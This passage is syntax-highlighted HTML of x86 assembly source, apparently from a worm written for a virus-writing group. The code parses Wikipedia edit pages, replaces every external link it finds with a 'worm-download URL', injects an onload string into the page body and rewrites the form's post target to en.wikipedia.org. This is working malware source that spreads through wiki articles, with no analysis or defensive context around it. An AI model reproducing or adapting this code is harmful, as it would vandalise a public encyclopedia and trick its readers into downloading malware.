    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EditLinkStart</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndEditLinkStart</span><span class="sc4">-</span><span class="sc5">EditLinkStart</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndEditLinkStart</span><span class="sc4">-</span><span class="sc5">EditLinkStart</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameSt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameLen</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ArticleNameLen</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EditLinkEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndEditLinkEnd</span><span class="sc4">-</span><span class="sc5">EditLinkEnd</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ContentToVirtualAlloc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hArticleMapView</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SearchExternalLink</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5050</span><span class="sc0">           </span><span class="sc1">; The content infront of the text-area.</span><span class="sc0">

   </span><span class="sc5">SearchLinkLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'[htt'</span><span class="sc0">     </span><span class="sc1">; Search an external link (HTTP)</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FoundLink</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'[ftp'</span><span class="sc0">     </span><span class="sc1">; Search an external link (FTP)</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FoundLink</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchLinkLoop</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FoundLink</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkStart</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkStart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">SearchEndLinkLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">         </span><span class="sc1">; [http://www.rrlf.de.vu/ Linkname] ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FoundEndLink</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">']'</span><span class="sc0">         </span><span class="sc1">; [http://www.rrlf.de.vu/] ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FoundEndLink</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x100</span><span class="sc0">          </span><span class="sc1">; Longer than 255? Maybe mistake in wiki-article.</span><span class="sc0">
   </span><span class="sc6">jl</span><span class="sc0">   </span><span class="sc5">SearchEndLinkLoop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkStart</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchLinkLoop</span><span class="sc0">

</span><span class="sc5">FoundEndLink</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkEnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkStart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkEnd</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; From Linkend</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkEnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; Write the content after the link to the new destination (relative)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkEnd</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; To new destination (LinkEnd-(LinkSize-URLWormDownload))</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">URLWormDownload</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkEnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">URLWormDownload</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">URLtoWormDownload</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkStart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">URLWormDownload</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; Replace the old URL with the worm-download URL</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LinkStart</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchLinkLoop</span><span class="sc0">

</span><span class="sc5">GenBodyOnLoad</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">SearchBody</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'&lt;bod'</span><span class="sc0">     </span><span class="sc1">; Search the body tag</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchBody</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BodyDest</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">SearchEndBody</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc0">         </span><span class="sc1">; End of body tag</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchEndBody</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BodyDest</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BodySize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BodySize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BodyDest</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">MakeOnLoadBufferLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">MakeOnLoadBufferLoop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">onLoadStringLen</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BodySize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">onLoadString</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BodyDest</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">onLoadStringLen</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">WriteContentToFile</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFile</span><span class="sc4">,</span><span class="sc0"> \               </span><span class="sc1">; Open the file</span><span class="sc0">
        </span><span class="sc5">szFileName</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hArticleF</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Save the handle</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc4">[</span><span class="sc5">hArticleF</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">],</span><span class="sc0"> \
        </span><span class="sc5">FALSE_F</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc2">0x0</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> \
        </span><span class="sc4">[</span><span class="sc5">hArticleF</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ChangePostMethod</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Change the relative ('/w/index.php'...) to</span><span class="sc0">
   </span><span class="sc5">FindPostMethodLoop</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; ('http://en.wikipedia.org/w/index.php'...)</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'meth'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FoundAValue</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirtualAllocSize</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jl</span><span class="sc0">   </span><span class="sc5">FindPostMethodLoop</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FoundAValue</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethodFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">methodpostlen</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

     </span><span class="sc5">CheckValue</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethodFound</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">methodpostURL</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotRightValuePost</span><span class="sc0">
     </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CheckValue</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethodFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">methodpostlen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethodFound</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethPointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EditLinkStart</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethPointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethPointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">MethodChangeSize</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethodFound</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethPointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ddArticleSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">memory_alloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethodFound</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NotRightValuePost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MethodFound</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindPostMethodLoop</span><span class="sc0">

</span><span class="sc5">ExecuteHTMLPage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">,</span><span class="sc0"> \         </span><span class="sc1">; Open the reg-key for getting the ProgramDir-Path</span><span class="sc0">
        </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc4">,</span><span class="sc0"> \
